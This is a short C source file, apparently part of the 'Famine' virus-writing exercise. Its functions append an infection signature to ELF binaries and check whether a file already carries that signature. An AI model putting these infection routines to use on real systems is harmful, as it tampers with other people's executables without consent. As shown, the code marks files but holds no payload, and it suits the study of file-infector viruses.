#define _GNU_SOURCE

#include "../incl/famine.h"

void    ft_infect(t_famine *famine)
{
    munmap(famine->elf, famine->file_size);
    close(famine->fd);
    famine->fd = open(famine->file, O_WRONLY);
    if (famine->fd == -1)
        return;
    lseek(famine->fd, 0, SEEK_END);
    write(famine->fd, SIGNATURE, strlen(SIGNATURE));
    close(famine->fd);
}

int    ft_detect_prev_infection(t_famine *famine)
{
    famine->signd = memmem(famine->elf, famine->file_size, SIGNATURE, strlen(SIGNATURE));
    if (famine->signd)
        return (0);
    else
        return (-1);
}